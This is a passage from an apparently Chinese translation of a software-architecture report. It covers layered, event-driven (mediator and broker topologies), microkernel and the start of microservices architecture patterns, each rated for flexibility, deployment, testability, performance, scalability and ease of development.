</p><p>那么为什么不允许展示层直接访问数据层呢。如果只是获得以及读取数据，展示层直接访问数据层，比穿过一层一层来得到数据来的快多了。这涉及到一个概念:层隔离。</p><p>层隔离就是说架构中的某一层的改变不会影响到其他层:这些变化的影响范围限于当前层次。如果展示层能够直接访问持久层了，假如持久层中的SQL变化了，这对业务层和展示层都有一定的影响。这只会让应用变得紧耦合，组件之间互相依赖。这种架构会非常的难以维护。</p><p>从另外一个方面来说，分层隔离使得层与层之间都是相互独立的，架构中的每一层的互相了解都很少。为了说明这个概念的牛逼之处，想象一个超级重构，把展示层从JSP换成JSF。假设展示层和业务层的之间的联系保持一致，业务层不会受到重构的影响，它和展示层所使用的界面架构完全独立。</p><p>然而封闭的架构层次也有不便之处，有时候也应该开放某一层。如果想往包含了一些由业务层的组件调用的普通服务组件的架构中添加一个分享服务层。在这个例子里，新建一个服务层通常是一个好主意，因为从架构上来说，它限制了分享服务访问业务层(也不允许访问展示层)。如果没有隔离层，就没有任何架构来限制展示层访问普通服务，难以进行权限管理。</p><p>在这个例子中，新的服务层是处于业务层之下的，展示层不能直接访问这个服务层中的组件。但是现在业务层还要通过服务层才能访问到持久层，这一点也不合理。这是分层架构中的老问题了，解决的办法是开放某些层。如表1-3所示，服务层现在是开放的了。请求可以绕过这一层，直接访问这一层下面的层。既然服务层是开放的，业务层可以绕过服务层，直接访问数据持久层。这样就非常合理。</p><p><img src="images/1-3.png" alt="1-3">     </p><p>开放和封闭层的概念确定了架构层和请求流之间的关系，并且给设计师和开发人员提供了必要的信息理解架构里各种层之间的访问限制。如果随意的开放或者封闭架构里的层，整个项目可能都是紧耦合，一团糟的。以后也难以测试，维护和部署。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>为了演示分层架构是如何工作的，想象一个场景，如表1-4，用户发出了一个请求要获得客户的信息。黑色的箭头是从数据库中获得用户数据的请求流，红色箭头显示用户数据的返回流的方向。在这个例子中，用户信息由客户数据和订单数组组成(客户下的订单)。</p><p>用户界面只管接受请求以及显示客户信息。它不管怎么得到数据的，或者说得到这些数据要用到哪些数据表。如果用户界面接到了一个查询客户信息的请求，它就会转发这个请求给用户委托(Customer Delegate)模块。这个模块能找到业务层里对应的模块处理对应数据(约束关系)。业务层里的customer object聚合了业务请求需要的所有信息(在这个例子里获取客户信息)。这个模块调用持久层中的 customer dao 来得到客户信息，调用order dao来得到订单信息。这些模块会执行SQL语句，然后返回相应的数据给业务层。当 customer object收到数据以后，它就会聚合这些数据然后传递给 customer delegate,然后传递这些数据到customer screen 展示在用户面前。</p><p><img src="images/1-4.png" alt="1-4">     </p><p>从技术的角度来说，有很多的方式能够实现这些模块。比如说在Java平台中，customer screen 对应的是 (JSF) Java Server Faces ,用 bean 组件来实现 customer delegate。用本地的Spring bean或者远程的EJB3 bean 来实现业务层中的customer object。上例中的数据访问可以用简单的POJP’s(Plain Old Java Objects)，或者可以用MyBatis，还可以用JDBC或者Hibernate 查询。Microsoft平台上，customer screen能用 .NET 库的ASP模块来访问业务层中的C#模块，用ADO来实现用户和订单数据的访问模块。</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>分层架构是一个很可靠的架构模式。它适合大多数的应用。如果你不确定在项目中使用什么架构，分层架构是再好不过的了。然后，从架构的角度上来说，选择这个模式还要考虑很多的东西。</p><p>第一个要注意的就是 污水池反模式(architecture sinkhole anti-pattern)。<br>在这个模式中，请求流只是简单的穿过层次，不留一点云彩，或者说只留下一阵青烟。比如说界面层响应了一个获得数据的请求。响应层把这个请求传递给了业务层，业务层也只是传递了这个请求到持久层，持久层对数据库做简单的SQL查询获得用户的数据。这个数据按照原理返回，不会有任何的二次处理，返回到界面上。</p><p>每个分层架构或多或少都可能遇到这种场景。关键在于这样的请求有多少。80-20原则可以帮助你确定架构是否处于反污水模式。大概有百分之二十的请求仅仅是做简单的穿越，百分之八十的请求会做一些业务逻辑操作。然而，如果这个比例反过来，大部分的请求都是仅仅穿过层，不做逻辑操作。那么开放一些架构层会比较好。不过由于缺少了层次隔离，项目会变得难以控制。</p><h3 id="模式分析-1"><a href="#模式分析-1" class="headerlink" title="模式分析"></a>模式分析</h3><p>下面的的表里分析了分层架构的各个方面。</p><h5 id="整体灵活性"><a href="#整体灵活性" class="headerlink" title="整体灵活性"></a>整体灵活性</h5><p>评级:低<br>分析:总体灵活性是响应环境变化的能力。尽管分层模式中的变化可以隔绝起来，想在这种架构中做一些也改变也是并且费时费力的。分层模式的笨重以及经常出现的组件之间的紧耦合是导致灵活性降低的原因。</p><h4 id="易于部署"><a href="#易于部署" class="headerlink" title="易于部署"></a>易于部署</h4><p>评级:低<br>分析:这取决于你怎么发布这种模式，发布程序可能比较麻烦，尤其是很大的项目。一个组件的小小改动可能会影响到整个程序的发布(或者程序的大部分)。发布必须是按照计划，在非工作时间或者周末进行发布。因此。分层模式导致应用发布一点也不流畅，在发布上降低了灵活性。</p><h4 id="可测试性"><a href="#可测试性" class="headerlink" title="可测试性"></a>可测试性</h4><p>评级:高<br>分析:因为组件都处于各自的层次中，可以模拟其他的层，或者说直接去掉层，所以分层模式很容易测试。开发者可以单独模拟一个展示组件，对业务组件进行隔绝测试。还可以模拟业务层来测试某个展示功能。</p><h4 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h4><p>评级:低<br>分析:尽管某些分层架构的性能表现的确不错，但是这个模式的特点导致它无法带来高性能。因为一次业务请求要穿越所有的架构层，做了很多不必要的工作。</p><h4 id="伸缩性"><a href="#伸缩性" class="headerlink" title="伸缩性"></a>伸缩性</h4><p>评级:低<br>分析:由于这种模式以紧密耦合的趋势在发展，规模也比较大，用分层架构构建的程序都比较难以扩展。你可以把各个层分成单独的物理模块或者干脆把整个程序分成多个节点来扩展分层架构，但是总体的关系过于紧密，这样很难扩展。</p><h4 id="易开发性"><a href="#易开发性" class="headerlink" title="易开发性"></a>易开发性</h4><p>评级:容易<br>分析:在开发难度上面，分层架构得到了比较高的分数。因为这种架构对大家来说很熟悉，不难实现。大部分公司在开发项目的都是通过层来区分技术的，这种模式对于大多数的商业项目开发来说都很合适。公司的组织架构和他们软件架构之间的联系被戏称为”Conway’s law”。你可以Google一下查查这个有趣的联系。</p><p><b id="chapter2"></b></p><h2 id="第二章-事件驱动架构"><a href="#第二章-事件驱动架构" class="headerlink" title="第二章 事件驱动架构"></a>第二章 事件驱动架构</h2><blockquote><p>译者注：文章中 mediator 及 broker 的概念很容易混淆，在文章的结尾处译者对两者的区别（还有 proxy）进行了一定的阐述</p></blockquote><p>事件驱动架构模式是一种主流的异步分发事件架构模式，常用于设计高度可拓展的应用。当然了，它有很高的适应性，使得它在小型应用、大型应用、复杂应用中都能表现得很好。事件驱动架构模式由高度解耦、单一目的的事件处理组件构成，这些组件负责异步接收和处理事件。</p><p>事件驱动架构模式包含了两种主要的拓扑结构：<strong>中介(mediator)</strong>拓扑结构和<strong>代理(broker)</strong>拓扑结构。 mediator 拓扑结构通常在你需要在事件内使用一个核心中介分配、协调多个步骤间的关系、执行顺序时使用；而代理拓扑结构则在你想要不通过一个核心中介将多个事件串联在一起时使用。由于这两种结构在结构特征和实现策略上有很大的差别，所以如果你想要在你的应用中使用它们的话，一定要深入理解两者的技术实现细节，从而为你的实际使用场景选择最合理的结构。</p><h3 id="中介-Mediator-拓扑结构"><a href="#中介-Mediator-拓扑结构" class="headerlink" title="中介 ( Mediator )拓扑结构"></a>中介 ( Mediator )拓扑结构</h3><p>中介拓扑结构适合用于拥有多个步骤，并需要在处理事件时能通过某种程度的协调将事件分层的场景，举例来说吧：假设你现在需要进行股票交易，那你首先需要证券所批准你进行交易，然后检查进行这次交易是否违反了股票交易的某种规定，检查完成后将它交给一个经纪人，计算佣金，最后与经纪人确认交易。以上所有步骤都需要通过中介进行某种程度的分配和协调，以决定各个步骤的执行顺序，判断哪些步骤可以并行，哪些步骤可以串行。</p><p>在中介拓扑结构中主要有四种组件：事件队列（event queue）, 事件中介, 事件通道（event channel）, 和 事件处理器（event processor）。当事件流需要被处理，客户端将一个事件发送到某个事件队列中，由消息队列将其运输给事件中介进行处理和分发。事件中介接收到该消息后，并通过将额外的异步事件发送给事件通道，让事件通道执行该异步事件中的每一个步骤，使得事件中介能够对事件进行分配、协调。同时，又因为事件处理器是事件通道的监听器，所以事件通道对异步事件的处理会触发事件处理器的监听事件，使事件处理器能够接收来自事件中介的事件，执行事件中具体的业务逻辑，从而完成对传入事件的处理。事件驱动架构模式中的中介拓扑模式结构大体如下图：</p><p><img src="images/2-1.png" alt="2-1"></p><p>在事件驱动架构中拥有十几个，甚至几百个事件队列是很常见的情况，该模式并没有对事件队列的实现有明确的要求，这就意味着事件队列可以是消息队列，Web 服务端，或者其它类似的东西。</p><p>在事件驱动架构模式中主要有两种事件：初始事件和待处理事件。初始事件是中介所接收到的最原始的事件，没有经过其他组件的处理；而待处理事件是由事件中介生成，由事件处理器接收的组件，不能把待处理事件看作初始事件经过处理后得到的事件，两者是完全不同的概念。</p><p>事件中介负责分配、协调初始事件中的各个待执行步骤，事件中介需要为每一个初始事件中的步骤发送一个特定的待处理事件到事件通道中，触发事件处理器接收和处理该待处理事件。这里需要注意的是：事件 中介没有真正参与到对初始事件必须处理的业务逻辑的实现之中；相反，事件中介只是知道初始事件中有哪些步骤需要被处理。</p><p>事件中介通过事件通道将与初始事件每一个执行步骤相关联的特定待处理事件传递给事件处理器。尽管我们通常在待处理事件能被多个事件处理器处理时才会在中介拓扑结构中使用 消息主题，但事件通道仍可以是消息队列或 消息主题。（但需要注意的是，尽管在使用 消息主题 时待处理事件能被多个事件处理器处理，但由于接收到的待处理事件各异，所以对其处理的操作也各不相同）</p><p>为了能顺利处理待处理事件，事件处理器组件中包含了应用的业务逻辑。此外，事件处理器作为事件驱动架构中的组件，不依赖于其他组件，独立运作，高度解耦，在应用或系统中完成特定的任务。当事件处理器需要处理的事件从细粒度（例如：计算订单的营业税）变为粗粒度（例如：处理一项保险索赔事务），必须要注意的是：一般来说，每一个事件处理器组件都只完成一项唯一的业务工作，并且事件处理器在完成其特定的业务工作时不能依赖其他事件处理器。</p><p>虽然事件中介有许多方法可以实现，但作为一名架构工程师，你应该了解所有实现方式，以确保你能为你的实际需求选择了最合适的事件中介。</p><p>事件中介最简单、常见的实现就是使用开源框架，例如：Spring Integration，Apache Camel，或 Mule ESB。事件流在这些开源框架中通常用 Java 或 域特定语言（domain-specific language）。在调节过程和业务流程都很复杂的使用场景下，你可以使用业务流程执行语言（BPEL - business process execution language）结合类似开源框架 Apache ODE 的 BPEL 引擎进行开发。BPEL 是一种基于 XML 的服务编制编程语言，它为处理初始事件时需要描述的数据和步骤提供了描述。对每一个拥有复杂业务流程（包括与用户交互的执行步骤）的大型应用来说，你可以使用类似 jBPM 的业务处理管理系统（business process manager）实现事件中介。</p><p>如果你需要使用中介拓扑结构，那么理解你的需求，并为其匹配恰当的事件中介实现是构建事件驱动架构过程中至关重要的一环。使用开源框架去解决非常复杂的业务处理、管理、调节事件，注定会失败，因为开源框架只是用 BPM 的方式解决了一些简单的事件分发逻辑，比起你的业务逻辑，其中的事件分发逻辑简直是九牛一毛。</p><p>为了解释清楚中介拓扑结构是怎么运作的，我假设你在某家保险公司买了保险，成为了受保人，然后你打算搬家。在这种情况下，初始事件就是重定位事件，或者其他类似的事件。与重定位事件相关的处理步骤就像下图展示的那样，处于事件中介之中。对每一个初始事件的传入，事件中介都会创建一个待处理事件（例如：改变地址，重新计算保险报价，等等……），并将它发送给事件通道，等待发出响应的事件处理器处理待处理事件（例如：客户改变地址的操作流程、报价计算流程，等等……）。直到初始事件中的每一个需要处理的步骤完成了，这项处理才会继续（例如：把所有手续都完成之后，保险公司才会帮你改变地址）。事件中介中，重新报价和更新理赔步骤上面的直线表示这些步骤可以并行处理。</p><p><img src="images/2-2.png" alt="2-1"></p><h3 id="代理-Broker-拓扑结构"><a href="#代理-Broker-拓扑结构" class="headerlink" title="代理 (Broker) 拓扑结构"></a>代理 (Broker) 拓扑结构</h3><p>代理拓扑结构与中介拓扑结构不同之处在于：代理拓扑结构中没有核心的事件中介；相反，事件流在代理拓扑结构中通过一个轻量的消息代理（例如：ActiveMQ, HornetQ，等等……）将消息串联成链状，分发至事件处理器组件中进行处理。代理扑结构适用的使用场景大致上具有以下特征：你的事件处理流相对来说比较简单，而且你不想（不需要）使用核心的事件分配、调节机制以提高你处理事件的效率。</p><p>在代理拓扑结构中主要包括两种组件：代理和事件处理器。代理可被集中或相互关联在一起使用，此外，代理中还可以包含所有事件流中使用的事件通道。</p><p>存在于代理组件中的事件通道可以是消息队列，消息主题,或者是两者的组合。</p><p>代理拓扑结构大致如下图，如你所见，在这其中没有一个核心的事件中介组件控制和分发初始事件；相反，每一个事件处理器只负责处理一个事件，并向外发送一个事件，以标明其刚刚执行的动作。例如，假设存在一个事件处理器用于平衡证券交易，那么事件处理器可能会接受一个拆分股票的初始事件，为了处理这项初始事件，事件处理器则需要重新平衡股票的投资金额，而这个重新平衡的事件将由另一个事件处理器接收、处理。在这其中有一个细节需要注意：处理初始事件后，由事件处理器发出的事件不被其他事件处理器接收、处理的情况时常会发生，尤其是你在为应用添加功能和进行功能拓展时，这种情况更为常见。</p><p><img src="images/2-3.png" alt="2-3"></p><p>为了阐明代理拓扑结构的运行机制，我会用一个与讲解中介拓扑结构时类似的例子（受保人旅行的例子）进行解释。因为在代理拓扑结构中没有核心事件中介接收初始事件，那么事件将由客户处理组件直接接收，改变客户的地址，并发出一个事件告知系统客户的地址被其进行了改变（例如：改变地址的事件）。在这个例子中：有两个事件处理器会与改变地址的事件产生关联：报价处理和索赔处理。报价事件处理器将根据受保人的新地址重新计算保险的金额，并发出事件告知系统该受保人的保险金额被其改变。而索赔事件处理器将接受到相同的改变地址事件，不同的是，它将更新保险的赔偿金额，并发出一个更新索赔金额事件告知系统该受保人的赔偿金额被其改变。当这些新的事件被其他事件处理器接收、处理，使事件链一环扣一环地交由系统处理，直到事件链上的所有事件都被处理完，初始事件的处理才算完成。</p><p><img src="images/2-4.png" alt="2-4">    </p><p>如上图所示，代理拓扑结构的设计思想就是将对事件流的处理转换为对事件链的业务功能处理，把代理拓扑结构看作是接力比赛是最好的理解方式：在一场4*100的接力比赛中，每一位运动员都需要拿着一根接力棒跑100米，运动员跑完自己的100米后需要将接力棒传递给下一位运动员，直到最后一位运动员拿着接力棒跑过终点线，整场接力比赛才算结束。根据这样的逻辑我们还可以知道：在代理拓扑结构中，一旦某个事件处理器将事件传递给另一个事件处理器，那么这个事件处理器不会与该事件的后续处理产生任何联系。</p><h3 id="顾虑"><a href="#顾虑" class="headerlink" title="顾虑"></a>顾虑</h3><p>实现事件驱动架构模式相对于实现其他架构模式会更困难一些，因为它通过异步处理进行事件分发。当你需要在你的应用中使用这种架构模式，你必须处理各种由事件分发处理带来的问题，例如：远程操作功能的可用性，缺少权限，以及在代理或中介中处理事件失败时，用于处理这种情况的重连逻辑。如果你不能很好地解决这些问题，那你的应用一定会出现各种 Bug，让开发团队痛苦不已。</p><p>在选择事件驱动架构时还有一点需要注意：在处理单个业务逻辑时，这种架构模式不能处理细粒度的事务。因为事件处理器都高度解耦、并且广泛分布，这使得在这些事件处理器中维持一个业务单元变得非常困难。因此，当你使用这种架构模式架构你的应用时，你必须不断地考虑哪些事件能单独被处理，哪些不能，并为此设计相应事件处理器的处理粒度。如果你发现你需要将一个业务单元切割成许多子单元，并一一匹配相应的事件处理器，那你就要为此进行代码设计；如果你发现你用多个不同的事件处理器处理的哪些业务其实是可以合并到一个业务事件之中的，那么这种模式可能并不适合你的应用，又或者是你的设计出了问题。</p><p>使用事件驱动架构模式最困难的地方就在于架构的创建、维护、以及对事件处理器的管理。通常每一个事件都拥有其指定的事件处理协议（例如：传递给事件处理器的数据类型、数据格式），这就使得设下标准的数据格式成为使用事件驱动架构模式中至关重要的一环（例如：XML，JSON，Java 对象，等等……），并在架构创建之初就为这些数据格式授权，以便处理。</p><h3 id="模式分析-2"><a href="#模式分析-2" class="headerlink" title="模式分析"></a>模式分析</h3><p>下面是基于对常见的架构模式特征进行评价的标准，对事件驱动架构模式所作的实际分析，评价是以常见的架构模式的相似实现作为标准进行的，如果你想知道进行对比的其他架构模式对应的特征，可以结尾处查看  <a href="#appendix">附录A</a> 的汇总表。 </p><h4 id="整体灵活性-1"><a href="#整体灵活性-1" class="headerlink" title="整体灵活性"></a>整体灵活性</h4><p>评价：高<br>分析：整体灵活性用于评价架构能否在不断改变的使用场景下快速响应，因为事件处理器组件使用目的单一、高度解耦、与其他事件处理器组件相互独立，不相关联，那么发生的改变对一个或多个事件处理器来说普遍都是独立的，使得对改变的反馈非常迅速，不需要依赖其他事件处理器的响应作出处理。</p><h4 id="易于部署-1"><a href="#易于部署-1" class="headerlink" title="易于部署"></a>易于部署</h4><p>评价：高<br>分析：总的来看，事件驱动架构模式由于其高度解耦的事件处理器组件的存在，对事件的部署相对来说比较容易，而使用代理拓扑结构比使用中介拓扑结构进行事件调度会更容易一些，主要是因为在 中介拓扑结构中事件处理器与事件中介紧密地耦合在一起：事件处理器中发生改变后，事件中介也随之改变，如果我们需要改变某个被处理的事件，那么我们需要同时调度事件处理器和事件中介。</p><h4 id="可测试性-1"><a href="#可测试性-1" class="headerlink" title="可测试性"></a>可测试性</h4><p>评价：低<br>分析：虽然在事件驱动架构模式中进行单元测试并不困难，但如果我们要进行单元测试，我们就需要某种特定的测试客户端或者是测试工具产生事件，为单元测试提供初始值。此外，由于事件驱动架构模式是异步进行事件分发的，其异步处理的特性也为单元测试带来了一定的困难。</p><h4 id="Performance-性能"><a href="#Performance-性能" class="headerlink" title="Performance 性能"></a>Performance 性能</h4><p>评价：高<br>分析：对消息传递的架构可能会让设计出来的事件驱动架构的表现不如我们的期望，但通常来说，该模式都能通过其异步处理的特性展示优秀的性能表现；换句话来说，高度解耦，异步并行操作大大减少了传递消息过程中带来的时间开销。</p><h4 id="伸缩性-1"><a href="#伸缩性-1" class="headerlink" title="伸缩性"></a>伸缩性</h4><p>评价：高<br>分析：事件驱动架构中的高度解耦、相互独立的事件处理器组件的存在，使得可拓展性成为该架构与生俱来的优点。架构的这些特定使得事件处理器能够进行细粒度的拓展，使得每一个事件处理器都能单独被拓展，而不影响其他事件处理器。</p><h4 id="易于开发"><a href="#易于开发" class="headerlink" title="易于开发"></a>易于开发</h4><p>评价：低<br>分析：由于使用事件驱动架构进行开发需要考虑其异步处理机制、协议创建流程，并且开发者需要用代码为事件处理器和操作失败的代理提供优秀的错误控制环境，无疑使得用事件驱动架构进行开发会比使用其他架构进行开发要困难一些。</p><h3 id="译者注"><a href="#译者注" class="headerlink" title="译者注"></a>译者注</h3><p>读完整篇文章，我相信大家对 mediator 与 broker 这两个概念有一个大致的印象，但就两者的译文来看，中介和代理似乎没什么区别，尤其是了解 proxy 的读者会更加困惑，这三者之间到底是什么关系？它们的概念是互通的吗？为了解决这种混淆，译者将在此阐述三者间的区别：</p><p>假如现在我有一个事件/事件流需要被处理，那么使用 mediator、broker、proxy 处理事件的区别在哪里呢？</p><ul><li><p>如果我们使用 mediator，那就意味着我将把事件流交给 mediator，mediator 会帮我把事件分解为多个步骤，并分析其中的执行逻辑，调整和分发事件（例如判断哪些事件可以并行，哪些事件可以串行），然后根据 mediator 分解、调节的结果去执行事件中的每一个步骤，把所有步骤完成后，就能把需要处理的事件处理好。</p></li><li><p>如果我们使用 broker，那就意味着我将把事件交给 broker，broker 获得事件后会把事件发出去（在本文中为：通知架构中所有可用的事件处理器），事件处理器们接收到事件以后，判断处理这个事件是否为自己的职责之一，如果不是则无视，与自己有关则把需要完成的工作完成，完成后如果事件还有后续需要处理的事件，则通过 broker 再次发布，再由相关的事件处理器接收、处理。以这样的方式将事件不断分解，沿着事件链一级一级地向下处理子事件，直到事件链中的所有事件被完成，我的事件也就处理好了。</p></li><li><p>如果我们使用 proxy，那就意味着我自己对需要处理的事件进行了分解，然后把不同的子事件一一委托给不同的 proxy，由被委托的 proxy 帮我完成子事件，从而完成我要做的事件。</p></li></ul><p><b id="chapter3"></b></p><h2 id="第三章-微内核架构"><a href="#第三章-微内核架构" class="headerlink" title="第三章 微内核架构"></a>第三章 微内核架构</h2><p>微内核架构模式(也称为插件化应用架构)对于基于产品的应用程序来说是一个很自然的选择。基于产品的应用是指一个经过打包的、可以通过版本下载的一个典型的第三方产品。然而，很多公司也会开发和发布他们的内部商业软件，完整的版本号、发布日志和可插拔的新特性，这些就非常符合微内核架构的思想。微内核架构模式可以通过插件的形式添加额外的特性到核心系统中，这提供了很好的扩展性，也使得新特性与核心系统隔离开来。( 译者注: 比如，著名的Eclipse IDE就是基于插件化开发的，eclipse核心更像是一个微内核，或者我们可把它叫做开放平台，其他的功能通过安装插件的形式添加到eclipse中。 )</p><h3 id="模式描述"><a href="#模式描述" class="headerlink" title="模式描述"></a>模式描述</h3><p>微内核架构主要需要考虑两个方面: 核心系统和插件模块。应用逻辑被划分为独立的插件模块和核心系统，这样就提供良好的可扩展性、灵活性，应用的新特性和自定义处理逻辑也会被隔离。图3-1演示了基本的微内核架构。</p><p>微内核架构的核心系统一般情况下只包含一个能够使系统运作起来的最小化模块。很多操作系统的实现就是使用微内核架构，因此这也是该架构名字的由来。从商业应用的角度看，核心系统通常是为特定的使用场景、规则、或者复杂条件处理定义了通用的业务逻辑，而插件模块根据这些规则实现了具体的业务逻辑。</p><p><img src="images/3-1.png" alt="3-1"></p><p>插件模块是一个包含专业处理、额外特性的独立组件，自定义代码意味着增加或者扩展核心系统以达到产生附加的业务逻辑的能力。通常，插件模块之间应该是没有任何依赖性的，但是你也可以设计一个需要依赖另一个插件的插件。但无论如何，使得插件之间可以通信的同时避免插件之间产生依赖又是一个特别重要的问题。</p><p>核心系统需要了解插件模块的可用性以及如何获取到它们。一个通用的实现方法是通过一组插件注册表。这个插件注册表含有每个插件模块的信息，包括它的名字、数据规约和远程访问协议(取决于插件如何与核心系统建立连接)。例如，一个税务软件的用于标识高风险的税务审计插件可能会有一个含有插件名(比如AuditChecker)的注册入口，数据规约(输入数据、输出数据)和规约格式( 比如xml )。如果这个插件是通过SOAP服务访问，那么它可能会包含一个WSDL (Web Services Definition Language).</p><p>插件模块可以通过多种方式连接到核心系统，包括OSGi ( open service gateway initiative )、消息机制、web服务或者直接点对点的绑定 ( 比如对象实例化，即依赖注入 )。你使用的连接类型取决于你构建的应用类型和你的特殊需求（比如单机部署还是分布式部署）。微内核架构本身没有指定任何的实现方式，唯一的规定就是插件模块之间不要产生依赖。</p><p>插件和核心系统的通信规范包含标准规范和自定义规范。自定义规范典型的使用场景是插件组件是被第三方构建的。在这种情况下，通常是在第三方插件规约和你的标准规范创建一个Adapter来使核心系统根本不需要知道每个插件的具体细节。当创建标准规范 ( 通常是通过XML或者Java Map )时，从一开始就创建一个版本策略是非常重要的。 </p><h3 id="架构示例"><a href="#架构示例" class="headerlink" title="架构示例"></a>架构示例</h3><p>也许微内核架构的最好示例就是大家熟知的Eclipse IDE了。下载最基本的Eclipse后，它只能提供一个编辑器。然后，一旦你开始添加插件，它就变成一个高度可定制化和非常有用的产品（译者注 : 更多内容大家可以参考 <a href="http://www.ituring.com.cn/article/6817" target="_blank" rel="external">开源软件架构 卷1：第6章 Eclipse之一</a> ）。浏览器是另一个使用微内核架构的产品示例，它由一个查看器和其他扩展的插件组成。</p><p>基于微内核架构的示例数不胜数，但是大型的商业应用呢？微内核应用架构也适用于这些情形。为了阐述这个观点，让我们来看看另一个保险公司的示例，但是这次的示例会涉及保险赔偿处理。  </p><p>赔偿处理是一个非常复杂的过程。每个州都有不同的关于保险赔偿的规则和条文。例如一些州允许在你的挡风玻璃被石头砸碎时免费进行替换，但是一些州则不是这样。因为大家的标准都不一样，因此赔偿标准几乎可以是无限的。</p><p>有很多保险赔偿应用运用大型和复杂的规则处理引擎来处理不同规则带来的复杂性。然而，可能会因为某条规则的改变而引起其他规则的改变而使得这些规则处理引擎变成一个大泥球，或者使简单需求变更会需要一个很大的分析师、工程师、测试工程师来进行处理。使用微内核架构能够很好的解决这个问题，核心系统只知道根据赔偿规则处理，但这个赔偿规则是抽象的，系统将赔偿规则作为一个插件规范，具体的规则有对应的实现，然后注入到系统中即可。</p><p>图3-2中的一堆文件夹代表了赔偿处理核心系统。它包含一些处理保险赔偿的基本业务逻辑。每一个插件模块包含每个州的具体赔偿规则。在这个例子中，插件模块通过自定义源代码实现或者分离规则引起实例。不管具体实现如何，关键就在于赔偿规则和处理都从核心系统中分离，而这些规则和处理过程都可以被动态地添加、移除，而这些改变对于核心系统和其他插件只有很小的影响或者根本不产生影响。</p><p><img src="images/3-2.png" alt="3-2"></p><h3 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h3><p>对于微内核架构来说一个很重要的一点就是它能够被嵌入或者说作为另一种架构的一部分。例如，如果这个架构解决的是一个你应用中易变领域的特定的问题 ( 译者注 : 即插件化能够解决你应用中的某个特定模块的架构问题 )，你可能会发现你不能在整个应用中使用这种架构。在这种情况下，你可以将微内核架构嵌入到另一个架构模式中 ( 比如分层架构 )。同样的，在上一章节中描述的事件驱动架构中的事件处理器组件也可以使用微内核架构。</p><p>微内核架构对渐进式设计和增量开发提供了非常好的支持。你可以先构建一个单纯的核心系统，随着应用的演进，系统会逐渐添加越来越多的特性和功能，而这并不会引起核心系统的重大变化。</p><p>对基于产品的应用来说，微内核架构应该是你的第一选择。特别是那些你会在后续开发中发布附加特性和控制哪些用户能够获取哪些特性的应用。如果你在后续开发中发现这个架构不能满足你的需求了，你能够根据你的特殊需求将你的应用重构为另一个更好的架构。</p><h3 id="模式分析-3"><a href="#模式分析-3" class="headerlink" title="模式分析"></a>模式分析</h3><p>下面的表格中包含了微内核架构每个特性的评级和分析。以微内核架构的最经典的实现方式的自然趋势为依据对每个特性进行评级。关于微内核架构与其他模式的相关性比较请参考附录A。</p><h4 id="整体灵活性-2"><a href="#整体灵活性-2" class="headerlink" title="整体灵活性"></a>整体灵活性</h4><p>评级 : 高<br>分析 : 整体灵活性是指能够快速适应不断变化的环境的能力。通过插件模块的松耦合实现，可以将变化隔离起来，并且快速满足需求。通常，微内核架构的核心系统很快趋于稳定，这样系统就变得很健壮，随着时间的推移它也不会发生多大改变。</p><h4 id="易于部署-2"><a href="#易于部署-2" class="headerlink" title="易于部署"></a>易于部署</h4><p>评级 : 高<br>分析 : 根据实现方式，插件模块能够在运行时被动态地添加到核心系统中 （ 比如，热部署 ）,把停机时间减到最小。</p><h4 id="可测试性-2"><a href="#可测试性-2" class="headerlink" title="可测试性"></a>可测试性</h4><p>评级 : 高<br>分析 : 插件模块能够被独立的测试，能够非常简单地被核心系统模拟出来进行演示，或者在对核心系统很小影响甚至没有影响的情况下对一个特定的特性进行原型展示。</p><h4 id="性能-1"><a href="#性能-1" class="headerlink" title="性能"></a>性能</h4><p>评级 : 高<br>分析 : 使用微内核架构不会自然而然地使你的应用变得高性能。通常，很多使用微内核架构的应用运行得很好，因为你能定制和简化应用程序，使它只包含那些你需要的功能模块。JBoss应用服务器就是这方面的优秀示例: 依赖于它的插件化架构，你可以只加载你需要的功能模块，移除那些消耗资源但没有使用的功能特性，比如远程访问，消息传递，消耗内存、CPU的缓存，以及线程，从而减小应用服务器的资源消耗。</p><h4 id="伸缩性-2"><a href="#伸缩性-2" class="headerlink" title="伸缩性"></a>伸缩性</h4><p>评级 : 低<br>分析 : 因为微内核架构的实现是基于产品的，它通常都比较小。它们以独立单元的形式实现，因此没有太高的伸缩性。此时，伸缩性就取决于你的插件模块，有时你可以在插件级别上提供可伸缩性，但是总的来说这个架构并不是以构建高度伸缩性的应用而著称的。</p><h4 id="易于开发-1"><a href="#易于开发-1" class="headerlink" title="易于开发"></a>易于开发</h4><p>评级 : 低<br>分析 : 微内核架构需要考虑设计和规约管理，使它不会很难实现。规约的版本控制，内部的插件注册，插件粒度，丰富的插件连接的方式等是涉及到这个架构模式实现复杂度的重要因素。</p><p><b id="chapter4"></b></p><h2 id="第四章-微服务架构"><a href="#第四章-微服务架构" class="headerlink" title="第四章 微服务架构"></a>第四章 微服务架构</h2><p>微服务架构模式作为替代单体应用和面向服务架构的一个可行的选择，在业内迅速取得进展。由于这个架构模式仍然在不断的发展中，在业界存在很多困惑——这种模式是关于什么的？它是如何实现的？本报告的这部分将为你提供关键概念和必要的基础知识来理解这一重要架构模式的好处(和取舍)，以此来判断这种架构是否适合你的应用。</p><h3 id="模式描述-1"><a href="#模式描述-1" class="headerlink" title="模式描述"></a>模式描述</h3><p>不管你选择哪种拓扑或实现风格,有几种常见的核心概念适用于一般架构模式。第一个概念是<em>单独部署单元</em>。如图4-1所示，微服务架构的每个组件都作为一个独立单元进行部署，让每个单元可以通过有效、简化的传输管道进行通信，同时它还有很强的扩展性，应用和组件之间高度解耦，使得部署更为简单。</p><p>也许要理解这种模式，最重要的概念就是服务组件（service component）。不要考虑微服务架构内部的服务，而最好是考虑服务组件，从粒度上讲它可以小到单一的模块，或者大至一个应用程序。服务组件包含一个或多个模块（如Java类），这些模块可以提供一个单一功能（如，为特定的城市或城镇提供天气情况），或也可以作为一个大型商业应用的一个独立部分（如，股票交易布局或测定汽车保险的费率）。在微服务架构中，正确设计服务组件的粒度是一个很大的挑战。在接下来的服务组件部分对这一挑战进行了详细的讨论。</p><p><img src="images/4-1.png" alt="4-1">     </p><p>微服务架构模式的另一个关键概念是它是一个<em>分布式</em>的架构，这意味着架构内部的所有组件之间是完全解耦的，并通过某种远程访问协议（如， JMS, AMQP, REST, SOAP, 